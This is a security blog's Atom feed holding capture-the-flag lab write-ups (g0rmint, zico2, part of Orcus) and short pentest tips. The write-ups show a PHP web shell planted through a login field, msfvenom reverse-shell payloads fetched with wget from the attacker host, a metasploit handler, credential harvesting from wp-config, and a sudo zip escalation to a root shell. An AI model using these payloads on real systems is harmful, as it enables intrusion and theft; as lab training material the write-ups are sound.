<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
	<title>m4l1c3.github.io</title>
	<link href="https://m4l1c3.github.io/atom.xml" rel="self" type="application/atom+xml"/>
  <link href="https://m4l1c3.github.io"/>
	<generator uri="https://www.getzola.org/">Zola</generator>
	<updated>2018-01-11T00:00:00+00:00</updated>
	<id>https://m4l1c3.github.io/atom.xml</id>
	<entry xml:lang="en">
		<title>g0rmint</title>
		<published>2018-01-11T00:00:00+00:00</published>
		<updated>2018-01-11T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/g0rmint/" type="text/html"/>
		<id>https://m4l1c3.github.io/g0rmint/</id>
		<content type="html">&lt;h1 id=&quot;g04mint&quot;&gt;g04mint&lt;&#x2F;h1&gt;
&lt;p&gt;First off, find the box:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;netdiscover -r 192.168.171.0&#x2F;24

Currently scanning: Finished!   |   Screen View: Unique Hosts

3 Captured ARP Req&#x2F;Rep packets, from 3 hosts.   Total size: 180
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor &#x2F; Hostname
-----------------------------------------------------------------------------
192.168.171.1   00:50:56:c0:00:01      1      60  VMware, Inc.
192.168.171.138 00:0c:29:1f:ad:4c      1      60  VMware, Inc.
192.168.171.254 00:50:56:fa:32:59      1      60  VMware, Inc.

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Scan with nmap:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap -T4 -A -oA g0rmint  192.168.171.138
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Looks like 22 and 80 are open, not a lot to go on...&lt;&#x2F;p&gt;
&lt;p&gt;Accessing the server on port 80 returns a 404 page, better try for a robots.txt and find this:&lt;&#x2F;p&gt;
&lt;p&gt;&#x2F;* Too easy? Lets see &lt;em&gt;&#x2F;
Disallow: &#x2F;g0rmint&#x2F;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Now I&#x27;m faced with a login page and nothing to go on, however the following showed up in the login page&#x27;s markup:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;meta name=&quot;backup-directory&quot; content=&quot;s3cretbackupdirect0ry&quot;&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Next run dirb to try and find hidden content, nothing really popped up.&lt;&#x2F;p&gt;
&lt;p&gt;I tried fuzzing a bunch of mobile user agents to see if this meta tag somehow triggers a different page response as well as brute forcing the login&#x2F;reset forms, nothing seemed to be working.&lt;&#x2F;p&gt;
&lt;p&gt;Then I remembered I need to try force browsing that directory now that new file system elements exist:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;
dirb http:&#x2F;&#x2F;192.168.171,138&#x2F;g0rmint&#x2F;s3crebackupdirect0ry -i -l

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This found an info.php file which shows backup.zip, lets download that and take a look&lt;&#x2F;p&gt;
&lt;p&gt;A few interesting things here, first the config file has a function for writing PHP files out to the server, and the login page calls this storing the email form field in the generated PHP.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;
function addlog($log, $reason) {
    $myFile = &quot;s3cr3t-dir3ct0ry-f0r-l0gs&#x2F;&quot; . date(&quot;Y-m-d&quot;) . &quot;.php&quot;;
    if (file_exists($myFile)) {
        $fh = fopen($myFile, &#x27;a&#x27;);
        fwrite($fh, $reason . $log . &quot;&lt;br&gt;\n&quot;);
    } else {
        $fh = fopen($myFile, &#x27;w&#x27;);
        fwrite($fh, file_get_contents(&quot;dummy.php&quot;) . &quot;&lt;br&gt;\n&quot;);
        fclose($fh);
        $fh = fopen($myFile, &#x27;a&#x27;);
        fwrite($fh, $reason . $log . &quot;&lt;br&gt;\n&quot;);
    }
    fclose($fh);
}

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Next looking at the register page if we know a legit user&#x2F;email combination the user&#x27;s password will be reset to the first 20 characters of a sha1 hash of the current date&#x2F;time in GMT, which luckily gets printed to the page each time you reload or submit a postback.&lt;&#x2F;p&gt;
&lt;p&gt;After a lot of banging my head I finally learned a vital piece I&#x27;m usually missing during enumeration, in this case we need an email.  What I&#x27;m finally learning is I should be searching better any time I have a known input, in this case the email can be searched for in all this source code:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;
grep -i -r -E -o &quot;\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\b&quot; *
Binary file backup.zip matches
css&#x2F;font-awesome.min.css:dave@davegandy.com
css&#x2F;style.css:w3bdrill3r@gmail.com
css&#x2F;style.css:timeline-left-arrow@2x.png
css&#x2F;style.css:timeline-right-arrow@2x.png
css&#x2F;style.css:chat-left@2x.png
css&#x2F;style.css:chat-right@2x.png
css&#x2F;style.css:chat-left-metro@2x.png
css&#x2F;style.css:chat-right-metro@2x.png
css&#x2F;font-awesome-ie7.min.css:dave@davegandy.com
db.sql:demo@example.com
Binary file img&#x2F;gallery&#x2F;photo5.jpg matches
js&#x2F;jquery.elfinder.min.js:troex@fury.scancode.ru
js&#x2F;jquery.elfinder.min.js:dio@std42.ru
js&#x2F;jquery.elfinder.min.js:troex@fury.scancode.ru
js&#x2F;jquery.elfinder.min.js:strogg@yandex.ru
js&#x2F;jquery.elfinder.min.js:hypweb@gmail.com

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now to review all the files, style.css seems like a good starting point, thats usually the place an author or developer would put their CSS for a site&#x2F;app.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;css&quot; class=&quot;language-css &quot;&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;
&#x2F;*
* Author: noman
* Author Email: w3bdrill3r@gmail.com
* Version: 1.0.0
* g0rmint: Bik gai hai
* Copyright: Aunty g0rmint
* www: http:&#x2F;&#x2F;g0rmint.com
* Site managed and developed by author himself
*&#x2F;

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Right in plain site, it even states the manager&#x2F;developer&#x2F;admin as this person.&lt;&#x2F;p&gt;
&lt;p&gt;Now to get our password, time to generate our hash:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;
substr(hash(&#x27;sha1&#x27;, &#x27;date time string from the page load&#x27;), 0, 20);

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;and we have our password.&lt;&#x2F;p&gt;
&lt;p&gt;With the amount of time that elapsed getting this far I had completely forgotten about the addslashes call in config.php which lead to me wasting hours trying to get decent code execution going.  Once I reviewed the code again getting execution was pretty straightforward:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;
&lt;?php echo shell_exec(base64decode($_GET[cmd])); ?&gt; 

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;as our email and we can start sending commands.&lt;&#x2F;p&gt;
&lt;p&gt;Now to generate a wget command to pull down a reverse_tcp shell:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;
msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST=192.168.171.136 LPORT=4444 R &gt; shell.php
echo &#x27;wget http:&#x2F;&#x2F;192.168.171.36:8000&#x2F;shell.php&#x27; | base64
d2dldCBodHRwOi8vMTkyLjE2OC4xNzEuMzY6ODAwMC9zaGVsbC5waHAK==
python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.171.138 - - [17&#x2F;Jan&#x2F;2018 22:32:39] &quot;GET &#x2F;shell.php HTTP&#x2F;1.1&quot; 200 -
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now to setup metasploit to handle the callback:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;
screen -S msf msfconsole

msf &gt; use exploit&#x2F;multi&#x2F;handler
msf exploit(handler) &gt; show options

Module options (exploit&#x2F;multi&#x2F;handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) &gt; set LHOST 192.168.171.136
LHOST =&gt; 192.168.171.136
msf exploit(handler) &gt; set LPORT 4444
LPORT =&gt; 4444

set PAYLOAD php&#x2F;meterpreter&#x2F;reverse_tcp

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then request our webshell, and we have a meterpreter session running.&lt;&#x2F;p&gt;
&lt;p&gt;Once connected I grabbed and ran LinEnum from rebootuser in hopes of finding something juicy.  Once I had the output I started parsing through and searched for vulns in the kernel, mysql, apache. logs, binaries, etc. and having nothing work.  Then took a look around and saw another backup.zip, extract and get this difference:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES
(1, &#x27;noman&#x27;, &#x27;w3bdrill3r@gmail.com&#x27;, &#x27;ea60b43e48f3c2de55e4fc89b3da53dc&#x27;);
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then crack the hash and get: tayyab123&lt;&#x2F;p&gt;
&lt;p&gt;Now to try ssh with the g0rmint user in &#x2F;etc&#x2F;passwd and get a login, run sudo -l:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;g0rmint@ubuntu:~$ sudo -l
[sudo] password for g0rmint:
Matching Defaults entries for g0rmint on ubuntu:
    env_reset, mail_badpass, secure_path=&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin

User g0rmint may run the following commands on ubuntu:
    (ALL : ALL) ALL
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Looks like we&#x27;re done: &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;
g0rmint@ubuntu:~$ sudo su
root@ubuntu:&#x2F;home&#x2F;g0rmint# ls &#x2F;root
flag.txt
root@ubuntu:&#x2F;home&#x2F;g0rmint# cat &#x2F;root&#x2F;flag.txt
Congrats you did it :)
Give me feedback @nomanriffat
root@ubuntu:&#x2F;home&#x2F;g0rmint#

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>zico2</title>
		<published>2017-12-26T00:00:00+00:00</published>
		<updated>2017-12-26T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/zico2/" type="text/html"/>
		<id>https://m4l1c3.github.io/zico2/</id>
		<content type="html">&lt;h1 id=&quot;zico2&quot;&gt;zico2&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;recon&quot;&gt;Recon:&lt;&#x2F;h2&gt;
&lt;p&gt;Start off with netdiscover to find the host:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; Currently scanning: Finished!   |   Screen View: Unique Hosts

 6 Captured ARP Req&#x2F;Rep packets, from 3 hosts.   Total size: 360
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor &#x2F; Hostname
 -----------------------------------------------------------------------------
 192.168.171.1   00:50:56:c0:00:01      1      60  VMware, Inc.
 192.168.171.135 00:0c:29:a2:b5:1b      2     120  VMware, Inc.
 192.168.171.254 00:50:56:e5:61:61      3     180  VMware, Inc.
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Next run nmap and find ports 22, 80, 111 open.&lt;&#x2F;p&gt;
&lt;p&gt;Time to run gobuster using wordlists generated from dirbuster and seclists:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;screen -S gobuster go run ~&#x2F;go&#x2F;src&#x2F;gobuster -w wordlistzico.txt -u http:&#x2F;&#x2F;192.168.171.135

&#x2F;&#x2F; (Status: 200)
&#x2F;&#x2F;js&#x2F; (Status: 200)
&#x2F;&#x2F;css&#x2F; (Status: 200)
&#x2F;&#x2F;?q=user&#x2F;register&#x2F; (Status: 200)
&#x2F;&#x2F;?q=user&#x2F;login&#x2F; (Status: 200)
&#x2F;&#x2F;?q=search&#x2F; (Status: 200)
&#x2F;&#x2F;?q=user&#x2F;password&#x2F; (Status: 200)
&#x2F;&#x2F;?q=comment&#x2F;reply&#x2F; (Status: 200)
&#x2F;&#x2F;?q=node&#x2F;add&#x2F; (Status: 200)
&#x2F;&#x2F;?q=admin&#x2F; (Status: 200)
&#x2F;&#x2F;index (Status: 200)
&#x2F;&#x2F;img&#x2F; (Status: 200)
&#x2F;&#x2F;?q=user&#x2F;logout&#x2F; (Status: 200)
&#x2F;&#x2F;?q=filter&#x2F;tips&#x2F; (Status: 200)
&#x2F;&#x2F;?level=12 (Status: 200)
&#x2F;&#x2F;? (Status: 200)
&#x2F;?&amp;what= (Status: 200)
&#x2F;&#x2F;?q=contact&#x2F; (Status: 200)
&#x2F;&#x2F;?q=logout&#x2F; (Status: 200)
&#x2F;&#x2F;?q=* (Status: 200)
&#x2F;&#x2F;?msk (Status: 200)
&#x2F;&#x2F;?favorites (Status: 200)
&#x2F;&#x2F;?* (Status: 200)
&#x2F;&#x2F;view.php (Status: 200)
&#x2F;js (Status: 301)
&#x2F;css (Status: 301)
&#x2F;img (Status: 301)
&#x2F;tools (Status: 200)
&#x2F;index (Status: 200)
&#x2F;view (Status: 200)
&#x2F;dbadmin (Status: 301)
&#x2F;vendor (Status: 301)
&#x2F;package (Status: 200)
&#x2F;LICENSE (Status: 200)
&#x2F;img (Status: 301)
&#x2F;index (Status: 200)
&#x2F;package (Status: 200)
&#x2F;view (Status: 200)
&#x2F;tools (Status: 200)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The dbadmin loads up a sql web admin, try admin as the pass and login successfully.&lt;&#x2F;p&gt;
&lt;p&gt;Now to lookup this version of phpliteadmin, 1.9.3&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;searchsploit phpliteadmin

PHPLiteAdmin 1.9.3 - Remote PHP Code Injection | exploits&#x2F;php&#x2F;webapps&#x2F;24044.txt
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Looks like it worked after following steps from the exploit description and we have a way to get a reverse shell going.&lt;&#x2F;p&gt;
&lt;p&gt;Now to generate a PHP meterpreter script:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST=192.168.171.136 LPORT=4444 R &gt; shell.php
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now to get a shell onto the box by adding a malicious DB column:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;?php system(&quot;wget http:&#x2F;&#x2F;192.168.171.136:8000&#x2F;shell.php -O &#x2F;usr&#x2F;databases&#x2F;shell.php&quot;);?&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now get meterpreter running:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfconsole
use exploit&#x2F;multi&#x2F;handler
set PAYLOAD php&#x2F;meterpreter&#x2F;reverse_tcp
set LHOST 192.168.171.136
set LPORT 4444
exploit
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then hit the page in the browser.&lt;&#x2F;p&gt;
&lt;p&gt;After some grepping I found a WordPress install, check the config for user&#x2F;passwords:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;
cat &#x2F;home&#x2F;zico&#x2F;wordpress&#x2F;wp-config | grep -i &#x27;user&#x27; &amp;&amp; cat &#x2F;home&#x2F;zico&#x2F;wordpress | grep -i &#x27;pass&#x27;

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Try SSHing with the user&#x2F;pass and succeed, next run LinEnum and linuxprivchecker.py, but none of the exploits reported seem to work, after a lot of head baning, check out the allowed&#x2F;banned sudo commands this user has:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;zico@zico:~$ sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin, secure_path=&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin

User zico may run the following commands on this host:
    (root) NOPASSWD: &#x2F;bin&#x2F;tar
    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;zip

sudo -u root zip &#x2F;tmp&#x2F;exploit.zip &#x2F;tmp&#x2F;exploit -T --unzip-comand=&quot;sh -c &#x2F;bin&#x2F;bash&quot;

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Get flag:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;
root@zico:~# cd &#x2F;root&#x2F;
root@zico:&#x2F;root# ls
flag.txt
root@zico:&#x2F;root# cat flag.txt
#
#
#
# ROOOOT!
# You did it! Congratz!
#
# Hope you enjoyed!
#
#
#
#

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Impersonating local requests with curl</title>
		<published>2017-12-04T00:00:00+00:00</published>
		<updated>2017-12-04T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/impersonating-local-requests-withcurl/" type="text/html"/>
		<id>https://m4l1c3.github.io/impersonating-local-requests-withcurl/</id>
		<content type="html">&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl -v --header &quot;X-Forwarded-For: 127.0.0.1&quot; --referer &quot;http:&#x2F;&#x2F;targetreferrer&quot; &quot;http:&#x2F;&#x2F;destinationsite&quot;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Local API Proxy Debugging in .Net</title>
		<published>2017-10-26T00:00:00+00:00</published>
		<updated>2017-10-26T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/local-api-proxy-debugging-dot-net/" type="text/html"/>
		<id>https://m4l1c3.github.io/local-api-proxy-debugging-dot-net/</id>
		<content type="html">&lt;h1 id=&quot;how-to-point-local-apis-to-burp-suite-in-a-microservice-architecture&quot;&gt;How to point local APIs to Burp Suite in a microservice architecture&lt;&#x2F;h1&gt;
&lt;p&gt;Add the following to your Web.config:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;xml&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;system.net&gt;
  &lt;defaultProxy&gt;
    &lt;proxy proxyaddress=&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot; bypassonlocal=&quot;False&quot; &#x2F;&gt;
  &lt;&#x2F;defaultProxy&gt;
&lt;&#x2F;system.net&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>lsof</title>
		<published>2017-08-22T00:00:00+00:00</published>
		<updated>2017-08-22T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/lsof/" type="text/html"/>
		<id>https://m4l1c3.github.io/lsof/</id>
		<content type="html">&lt;p&gt;lsof get a list of running files: man lsof&lt;&#x2F;p&gt;
&lt;p&gt;grep -ir &#x27;root&#x27; 2&amp;gt;&amp;amp;1 | grep &#x27;123456&#x27; 2&amp;gt;&amp;amp;1 | grep -v &#x27;denied&#x27;&lt;&#x2F;p&gt;
&lt;p&gt;Useful for times when you are ripping through the entire file system (with or without priviliges) and supress the &#x27;Access denied&#x27; messages so inaccessible information is not shown in grep output.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>hackfest2016-Orcus</title>
		<published>2017-08-07T00:00:00+00:00</published>
		<updated>2017-08-07T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/hackfest-2016-orcus/" type="text/html"/>
		<id>https://m4l1c3.github.io/hackfest-2016-orcus/</id>
		<content type="html">&lt;h1 id=&quot;orcus&quot;&gt;Orcus&lt;&#x2F;h1&gt;
&lt;p&gt;Start out by hitting: http:&#x2F;&#x2F;10.37.129.9&#x2F; looks about the same as the previous two.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;recon&quot;&gt;Recon!&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;netdiscover&quot;&gt;netdiscover&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sudo netdiscover -r 10.37.129.0&#x2F;24
Currently scanning: Finished!   |   Screen View: Unique Hosts

3 Captured ARP Req&#x2F;Rep packets, from 3 hosts.   Total size: 144
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor &#x2F; Hostname
-----------------------------------------------------------------------------
10.37.129.1     00:1c:42:00:00:19      1      42  Parallels, Inc.
10.37.129.2     00:1c:42:00:00:09      1      42  Parallels, Inc.
10.37.129.9     00:1c:42:1e:25:17      1      60  Parallels, Inc.
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;nmap&quot;&gt;nmap&lt;&#x2F;h3&gt;
&lt;p&gt;nmap -T4 -sV -v 10.37.129.9 -oA orcus&lt;&#x2F;p&gt;
&lt;p&gt;Starting Nmap 7.50 ( https:&#x2F;&#x2F;nmap.org ) at 2017-08-10 21:30 MDT
NSE: Loaded 41 scripts for scanning.
Initiating Ping Scan at 21:30
Scanning 10.37.129.9 [2 ports]
Completed Ping Scan at 21:30, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:30
Stats: 0:00:11 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Completed Parallel DNS resolution of 1 host. at 21:31, 13.00s elapsed
Initiating Connect Scan at 21:31
Scanning 10.37.129.9 [1000 ports]
Discovered open port 995&#x2F;tcp on 10.37.129.9
Discovered open port 143&#x2F;tcp on 10.37.129.9
Discovered open port 443&#x2F;tcp on 10.37.129.9
Discovered open port 53&#x2F;tcp on 10.37.129.9
Discovered open port 139&#x2F;tcp on 10.37.129.9
Discovered open port 445&#x2F;tcp on 10.37.129.9
Discovered open port 110&#x2F;tcp on 10.37.129.9
Discovered open port 22&#x2F;tcp on 10.37.129.9
Discovered open port 993&#x2F;tcp on 10.37.129.9
Discovered open port 111&#x2F;tcp on 10.37.129.9
Discovered open port 80&#x2F;tcp on 10.37.129.9
Discovered open port 2049&#x2F;tcp on 10.37.129.9
Completed Connect Scan at 21:31, 0.08s elapsed (1000 total ports)
Initiating Service scan at 21:31
Scanning 12 services on 10.37.129.9
Completed Service scan at 21:31, 11.02s elapsed (12 services on 1 host)
NSE: Script scanning 10.37.129.9.
Initiating NSE at 21:31
Completed NSE at 21:31, 0.04s elapsed
Initiating NSE at 21:31
Completed NSE at 21:31, 0.00s elapsed
Nmap scan report for 10.37.129.9
Host is up (0.0048s latency).
Not shown: 988 closed ports
PORT     STATE SERVICE     VERSION
22&#x2F;tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
53&#x2F;tcp   open  domain      ISC BIND 9.10.3-P4-Ubuntu
80&#x2F;tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
110&#x2F;tcp  open  pop3        Dovecot pop3d
111&#x2F;tcp  open  rpcbind     2-4 (RPC #100000)
139&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143&#x2F;tcp  open  imap        Dovecot imapd
443&#x2F;tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
445&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
993&#x2F;tcp  open  ssl&#x2F;imap    Dovecot imapd
995&#x2F;tcp  open  ssl&#x2F;pop3    Dovecot pop3d
2049&#x2F;tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: ORCUS; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel&lt;&#x2F;p&gt;
&lt;p&gt;Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap
Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
Nmap done: 1 IP address (1 host up) scanned in 24.49 seconds&lt;&#x2F;p&gt;
&lt;h3 id=&quot;nikto&quot;&gt;nikto&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nikto -host 10.37.129.9 -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.37.129.9
+ Target Hostname:    10.37.129.9
+ Target Port:        80
+ Start Time:         2017-08-07 20:42:45 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache&#x2F;2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file &#x2F;, fields: 0x65 0x53ff6086e56aa
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ Entry &#x27;&#x2F;exponent.js.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;exponent.js2.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;exponent.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;exponent_bootstrap.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;exponent_constants.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (500)
+ Entry &#x27;&#x2F;exponent_php_setup.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;exponent_version.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;getswversion.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;login.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ Entry &#x27;&#x2F;overrides.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;selector.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;site_rss.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ Entry &#x27;&#x2F;source_selector.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
